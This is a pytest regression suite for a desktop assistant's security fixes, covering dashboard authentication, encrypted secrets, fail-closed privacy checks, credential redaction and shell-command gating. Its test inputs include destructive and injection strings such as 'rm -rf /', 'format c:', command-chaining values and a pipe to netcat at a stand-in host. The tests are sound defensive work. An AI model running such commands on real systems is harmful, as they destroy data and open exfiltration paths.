"""
tests/test_phase0_security.py — Regression tests for the Phase 0 hardening pass.

Every test here corresponds to a concrete defect found by code audit. They are
written so that reverting a fix turns the test RED, which is the point: the
existing suite passed while several of these bugs were live.

Covered:
  1. secret_vault decrypt/encrypt symmetry across dicts AND lists
  2. dashboard auth on the four screen/privacy endpoints
  3. dashboard WebSocket auth (the empty-token bypass)
  4. mandatory encryption on /api/command
  5. privacy_guard fail-CLOSED behaviour in the screenshot paths
  6. devops_sentinel routes through the run_command safety model
  7. macro replay fails CLOSED when the confirm gate errors
  8. api_sniffer never puts live credentials in an LLM prompt
  9. native_hacks has no shell=True command injection
  10. upload path containment (no traversal)
"""
from __future__ import annotations

import inspect
import re
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parent.parent


# ─────────────────────────────────────────────────────────────────────────────
# 1. Secret vault: encrypt and decrypt must be structurally symmetric
# ─────────────────────────────────────────────────────────────────────────────

def test_secret_vault_roundtrips_secrets_inside_lists():
    """A list of bare secrets (e.g. a key-rotation pool) has no per-element key
    name, so the parent key is the only signal. Both directions must handle it.

    Regression: the writer walked lists, the reader did not — so
    `custom_providers[].api_key` was stored as ENC(...) and read back still
    ENC(...), and that ciphertext was sent to the provider as a Bearer token.
    """
    from core.secret_vault import encrypt_tree, decrypt_dict

    cfg = {
        "gemini_api_key": "AIzaSyROOT",
        "gemini_api_keys": ["AIzaSyA", "AIzaSyB"],
        "custom_providers": [{"name": "groq", "api_key": "gsk_SECRET"}],
        "nested": {"outer": {"api_key": "DEEP_SECRET"}},
        "voice_name": "hi-IN-SwaraNeural",
        "harmless_list": ["a", "b"],
        "harmless_mixed": ["a", 1],
    }

    enc = encrypt_tree(dict(cfg))

    # Secrets are actually encrypted at rest, including inside lists.
    assert enc["gemini_api_key"].startswith("ENC(")
    assert all(x.startswith("ENC(") for x in enc["gemini_api_keys"])
    assert enc["custom_providers"][0]["api_key"].startswith("ENC(")
    assert enc["nested"]["outer"]["api_key"].startswith("ENC(")

    # Non-secrets are untouched (no false positives).
    assert enc["voice_name"] == "hi-IN-SwaraNeural"
    assert enc["harmless_list"] == ["a", "b"]
    assert enc["harmless_mixed"] == ["a", 1]

    dec = decrypt_dict(enc)
    assert dec["gemini_api_key"] == "AIzaSyROOT"
    assert dec["gemini_api_keys"] == ["AIzaSyA", "AIzaSyB"]
    assert dec["custom_providers"][0]["api_key"] == "gsk_SECRET"
    assert dec["nested"]["outer"]["api_key"] == "DEEP_SECRET"
    assert dec["voice_name"] == "hi-IN-SwaraNeural"
    assert dec["harmless_list"] == ["a", "b"]
    assert dec["harmless_mixed"] == ["a", 1]

    # Nothing anywhere still looks like ciphertext.
    assert "ENC(" not in repr(dec)


def test_decrypt_dict_does_not_mutate_input():
    """Callers pass their loaded config straight in; it must not be modified."""
    from core.secret_vault import encrypt_tree, decrypt_dict

    enc = encrypt_tree({"api_key": "SECRET", "n": 5})
    snapshot = repr(enc)
    decrypt_dict(enc)
    assert repr(enc) == snapshot


# ─────────────────────────────────────────────────────────────────────────────
# 2/3/4. Dashboard authentication
# ─────────────────────────────────────────────────────────────────────────────

def _authed(srv, token="tok-test"):
    import time as _t
    srv._tokens.add(token)
    srv._token_keys[token] = srv.new_key(expiry_secs=600)
    srv._token_created[token] = _t.time()
    return {"Authorization": f"Bearer {token}"}


def test_screen_and_privacy_endpoints_require_auth():
    """Regression: /api/screen-frame, /api/screen-stream.mjpg,
    /api/screen-stream/toggle and /api/privacy/status had NO _auth() call while
    the server bound 0.0.0.0 — any LAN host could pull a live screen capture."""
    from fastapi.testclient import TestClient
    from dashboard.server import DashboardServer

    client = TestClient(DashboardServer().app)
    assert client.get("/api/screen-frame").status_code == 401
    assert client.get("/api/screen-stream.mjpg").status_code == 401
    assert client.get("/api/privacy/status").status_code == 401
    assert client.post("/api/screen-stream/toggle", json={"allowed": True}).status_code == 401


def test_websocket_screen_stream_rejects_empty_token():
    """Regression: the guard read `if tok and tok not in self._tokens`, so an
    EMPTY token short-circuited the condition and the socket was accepted. The
    two sibling handlers already used the correct `if not tok or ...` form.

    AST-based: every websocket handler body must call _auth_token before
    accept(). Checking the source text directly is fragile because several
    handlers now carry comments describing the old bug.
    """
    import ast

    src_path = _ROOT / "dashboard" / "server.py"
    text = src_path.read_text(encoding="utf-8")
    tree = ast.parse(text)

    ws_funcs = []
    for node in ast.walk(tree):
        if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        # A websocket route handler takes a `websocket` parameter AND calls
        # websocket.accept() somewhere in its body.
        if not any(a.arg == "websocket" for a in node.args.args):
            continue
        seg = ast.get_source_segment(text, node) or ""
        if "accept(" not in seg:
            continue
        ws_funcs.append((node.name, node))

    assert ws_funcs, "expected websocket handlers in dashboard/server.py"
    assert len(ws_funcs) >= 3, f"expected 3 websocket handlers, found {len(ws_funcs)}"

    for name, node in ws_funcs:
        # _auth_token must actually be CALLED (an ast.Call node), not merely
        # mentioned in the docstring that documents the fix.
        called = any(
            isinstance(n, ast.Call)
            and isinstance(n.func, ast.Name)
            and n.func.id == "_auth_token"
            for n in ast.walk(node)
        )
        assert called, f"{name} does not CALL _auth_token() — it may accept an empty token"

        # The empty-token bypass `if tok and tok not in ...` must be gone.
        # Checked over real ast.If nodes so the explanatory docstring — which
        # quotes the old buggy line verbatim — cannot cause a false positive.
        for stmt in ast.walk(node):
            if isinstance(stmt, ast.If):
                s = ast.dump(stmt.test)
                assert not ("NotIn" in s and "BoolOp" in s), (
                    f"{name} still contains `if tok and tok not in ...` "
                    f"— the empty-token bypass"
                )


def test_command_endpoint_refuses_plaintext():
    """Regression: `enc` was optional, so the AES transport was bypassed by
    omitting one field and commands travelled in the clear."""
    from fastapi.testclient import TestClient
    from dashboard.server import DashboardServer

    srv = DashboardServer()
    headers = _authed(srv)
    client = TestClient(srv.app)

    r = client.post("/api/command", json={"text": "rm -rf /"}, headers=headers)
    assert r.status_code == 400
    assert "enc" in r.json().get("error", "").lower()

    # A forged/garbage ciphertext is also refused, not silently executed.
    r2 = client.post("/api/command", json={"enc": "not-real-ciphertext"}, headers=headers)
    assert r2.status_code == 400


def _find_nested_func_body(path: Path, func_name: str) -> str:
    """Return the source of a nested (closure) function by name.

    The dashboard auth helpers live inside _build_app, so they are not
    importable — this walks the AST to find them and returns their source.
    """
    import ast

    text = path.read_text(encoding="utf-8")
    tree = ast.parse(text)
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name == func_name:
            return ast.get_source_segment(text, node) or ""
    raise AssertionError(f"{func_name} not found in {path}")


def test_auth_uses_constant_time_comparison():
    """Bearer tokens should be compared with secrets.compare_digest, not `in`."""
    body = _find_nested_func_body(_ROOT / "dashboard" / "server.py", "_auth")
    assert "compare_digest" in body, "_auth must compare tokens in constant time"
    # The set-membership form is the thing being replaced.
    assert not re.search(r"\btok\s+in\s+self\._tokens\b", body)


def test_token_ttl_sweep_runs_outside_login():
    """Regression: the 24h TTL sweep lived only inside /login, so if nobody
    re-logged in, tokens from /auto-login and /api/device-login never expired."""
    body = _find_nested_func_body(_ROOT / "dashboard" / "server.py", "_auth")
    assert "_sweep_expired_tokens()" in body


def test_upload_download_path_is_contained():
    """Regression: /uploads/{filename} stripped separators instead of proving
    containment. It now resolves and requires is_relative_to(uploads_root)."""
    src = (_ROOT / "dashboard" / "server.py").read_text(encoding="utf-8")
    seg = src.split("async def download_file")[1].split("@app.websocket")[0]
    assert "is_relative_to" in seg


# ─────────────────────────────────────────────────────────────────────────────
# 5. Privacy guard must fail CLOSED
# ─────────────────────────────────────────────────────────────────────────────

def test_screenshot_paths_fail_closed():
    """Regression: every capture site wrapped the guard in
    `try: ... except Exception: pass`, so ANY bug or missing dependency in the
    guard silently disabled it and the capture proceeded."""
    for rel in ("actions/screen_processor.py",
                "actions/screen_timeline.py",
                "actions/screen_troubleshooter.py"):
        src = (_ROOT / rel).read_text(encoding="utf-8")
        # Find the guard call and confirm it is followed by an explicit denial.
        assert "is_screen_capture_allowed" in src, f"{rel} does not consult the guard"
        idx = src.index("is_screen_capture_allowed")
        window = src[idx: idx + 900]
        # A bare `except ... : pass` immediately after the guard is the bug.
        assert not re.search(r"except Exception[^\n]*:\s*\n\s*pass\b", window), (
            f"{rel}: privacy guard still fails OPEN on exception"
        )


def test_all_screen_capture_sites_are_guarded():
    """computer_control, code_helper and game_updater captured screens with no
    privacy check at all. computer_control._screen_find uploads the full screen
    to a cloud model, so Privacy Mode did not protect it."""
    from actions.computer_control import _privacy_allows_capture, _screenshot
    from actions import code_helper

    # Guard helper exists and denies when the shield is engaged.
    allowed, reason = _privacy_allows_capture()
    assert isinstance(allowed, bool) and isinstance(reason, str)

    # code_helper must consult the guard before capturing.
    src = inspect.getsource(code_helper._take_screenshot)
    assert "is_screen_capture_allowed" in src


def test_privacy_guard_localhost_list_has_no_test_sentinel():
    """Regression: 'testclient' was in the PRODUCTION localhost allowlist, so
    any caller passing client_ip='testclient' bypassed the LAN check. The real
    IPv4-mapped IPv6 loopback (::ffff:127.0.0.1) was missing instead.

    Behavioural, not textual: a future refactor that renames things shouldn't
    silently pass, and one that reintroduces the sentinel must fail.
    """
    from core.privacy_guard import is_screen_capture_allowed, set_stream_allowed, set_privacy_mode

    set_privacy_mode(False)
    set_stream_allowed(True)
    try:
        # "testclient" must NOT be treated as loopback.
        allowed_test, _ = is_screen_capture_allowed(is_stream=True, client_ip="testclient")
        assert allowed_test is False, "test-only sentinel must not bypass the LAN guard"

        # Real loopback forms must be accepted (so long as nothing else blocks).
        for ip in ("127.0.0.1", "::1", "::ffff:127.0.0.1"):
            allowed_ok, reason = is_screen_capture_allowed(is_stream=True, client_ip=ip)
            assert allowed_ok is True, f"loopback {ip} should be allowed ({reason})"

        # A genuine LAN address must still be refused.
        allowed_lan, _ = is_screen_capture_allowed(is_stream=True, client_ip="192.168.1.50")
        assert allowed_lan is False
    finally:
        set_stream_allowed(False)


# ─────────────────────────────────────────────────────────────────────────────
# 6/7. Command execution must be gated and fail closed
# ─────────────────────────────────────────────────────────────────────────────

def test_devops_sentinel_is_gated():
    """Regression: devops_sentinel handed the command straight to
    Popen(shell=True) with no allowlist/blocklist/confirm gate, and
    edge_router routes spoken text straight into it."""
    from actions.devops_sentinel import _sentinel_gate

    # A destructive command must be refused outright.
    assert _sentinel_gate("format c:", None) is not None
    assert _sentinel_gate("del /f important.txt", None) is not None

    # An allowlisted, operator-free command proceeds.
    assert _sentinel_gate("git status", None) is None

    # Chained shell metacharacters are never instant-allowed; they must be
    # diverted to the confirm gate rather than run.
    assert _sentinel_gate("echo hi & calc", None) is not None


def test_devops_sentinel_edge_route_is_no_longer_unconditional_rce():
    """The router hands spoken text to the sentinel. Confirm the action still
    exists (behaviour preserved) but the shell is now gated inside it."""
    from actions.devops_sentinel import watch_command
    src = inspect.getsource(watch_command)
    assert "_sentinel_gate" in src


def test_macro_replay_fails_closed():
    """Regression: `except Exception: return _play(...)` turned a confirm-gated
    macro replay (raw keyboard/mouse injection) into an UNGATED one whenever the
    confirm module misbehaved."""
    from actions import macro
    src = inspect.getsource(macro)
    play_block = src.split('if action in ("play"')[1][:2500]
    assert "Confirm gate unavailable" in play_block
    assert not re.search(r"except Exception[^\n]*:\s*\n\s*return _play\(", play_block), (
        "macro replay still fails OPEN when the confirm gate errors"
    )


def test_run_command_predicates_reject_shell_chaining():
    """The baseline safety model other modules are expected to reuse."""
    from actions.run_command import _is_allowed
    for cmd in ("echo hi & calc", "git status; rm -rf /", "echo x | nc evil 1",
                "echo `whoami`", "echo $(id)", "git status\ncalc"):
        assert _is_allowed(cmd) is False, f"{cmd!r} must not be instantly allowed"


# ─────────────────────────────────────────────────────────────────────────────
# 8. No credential may reach an LLM prompt
# ─────────────────────────────────────────────────────────────────────────────

def test_api_sniffer_redacts_credentials():
    """Regression: the sniffer copied authorization / cookie / x-api-key straight
    out of the live browser session into a Gemini prompt, with no redaction."""
    from actions.api_sniffer import _redact_headers, _redact_traffic

    h = _redact_headers({
        "Authorization": "Bearer ghs_REALTOKEN",
        "Cookie": "session=abc123",
        "X-API-Key": "sk-live-9999",
        "Content-Type": "application/json",
        "Accept": "*/*",
    })
    assert "ghs_REALTOKEN" not in repr(h)
    assert "abc123" not in repr(h)
    assert "sk-live-9999" not in repr(h)
    # Header NAMES survive — they're what makes the analysis useful.
    assert "Authorization" in h and "Content-Type" in h
    assert h["Content-Type"] == "application/json"

    traffic = _redact_traffic([{"url": "https://x/api", "headers": h}])
    assert "ghs_REALTOKEN" not in repr(traffic)

    # The capture site itself must redact, so unredacted values never exist.
    src = (_ROOT / "actions" / "api_sniffer.py").read_text(encoding="utf-8")
    assert "_redact_headers(req.headers)" in src


# ─────────────────────────────────────────────────────────────────────────────
# 9. No shell=True with interpolated values
# ─────────────────────────────────────────────────────────────────────────────

def _shell_true_call_sites(rel: str):
    """AST scan for subprocess calls passing shell=True.

    Deliberately AST-based rather than a substring search: after the fixes the
    explanatory comments still *mention* `shell=True`, and a naive grep over the
    source would both false-positive on those comments and miss a call built
    with a keyword dict. AST sees only real code.
    """
    import ast

    tree = ast.parse((_ROOT / rel).read_text(encoding="utf-8"))
    hits = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        fn = node.func
        name = ""
        if isinstance(fn, ast.Attribute):
            name = fn.attr
        elif isinstance(fn, ast.Name):
            name = fn.id
        if name not in {"Popen", "run", "call", "check_call", "check_output"}:
            continue
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                hits.append((name, node.lineno))
    return hits


def test_native_hacks_has_no_shell_injection():
    """Regression: check_output(f'tasklist /FI "IMAGENAME eq {clean}.exe"',
    shell=True) — `clean` came from a model-supplied process name."""
    from core.native_hacks import is_native_process_running

    assert _shell_true_call_sites("core/native_hacks.py") == []
    # Behavioural check as well: metacharacters are rejected, not executed.
    assert is_native_process_running('foo" & calc &') is False
    assert is_native_process_running("foo | calc") is False
    assert is_native_process_running("") is False


@pytest.mark.parametrize("rel", [
    "actions/open_app.py",
    "actions/dev_agent.py",
])
def test_no_shell_true_in_launchers(rel):
    """open_app and dev_agent launched processes with shell=True on
    model-supplied strings / argv lists (the CVE-2024-4030 class)."""
    assert _shell_true_call_sites(rel) == [], f"{rel} still passes shell=True"


def test_open_app_uses_cmd_list_form():
    """Windows `start` has no argv form, so cmd.exe must be invoked as a LIST
    rather than letting a shell re-parse our quoting.

    Checks the AST for a list literal whose first element is the string "cmd"
    (that's what `cmd = ["cmd", "/c", "start", "", target, *extra]` compiles to).
    """
    import ast

    from actions.open_app import _win_start

    tree = ast.parse(inspect.getsource(_win_start))
    found = False
    for node in ast.walk(tree):
        if isinstance(node, ast.List) and node.elts:
            first = node.elts[0]
            if isinstance(first, ast.Constant) and first.value == "cmd":
                found = True
                break
    assert found, "_win_start should build a [\"cmd\", \"/c\", \"start\", ...] argv list"


# ─────────────────────────────────────────────────────────────────────────────
# 10. Credential loading consistency
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("rel,fn_name", [
    ("actions/computer_control.py", "_get_api_key"),
    ("actions/computer_settings.py", "_get_api_key"),
])
def test_api_key_readers_use_the_decrypting_loader(rel, fn_name):
    """Regression: these two read config/api_keys.json RAW, so once the vault
    encrypted the config they returned the literal ENC(...) blob and every LLM
    feature in the module failed with an opaque auth error."""
    mod = __import__(rel.replace("/", ".").replace(".py", ""), fromlist=[fn_name])
    fn = getattr(mod, fn_name)
    assert fn() == "" or not fn().startswith("ENC(")
    assert "load_api_keys" in inspect.getsource(fn)


# ─────────────────────────────────────────────────────────────────────────────
# Compile-time guarantee that no Phase 0 file has a syntax error
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("rel", [
    "core/secret_vault.py", "core/native_hacks.py", "core/privacy_guard.py",
    "memory/config_manager.py", "dashboard/server.py",
    "actions/screen_processor.py", "actions/screen_timeline.py",
    "actions/screen_troubleshooter.py", "actions/computer_control.py",
    "actions/computer_settings.py", "actions/code_helper.py",
    "actions/game_updater.py", "actions/devops_sentinel.py",
    "actions/macro.py", "actions/open_app.py", "actions/dev_agent.py",
    "actions/api_sniffer.py",
])
def test_phase0_files_parse(rel):
    compile((_ROOT / rel).read_text(encoding="utf-8"), rel, "exec")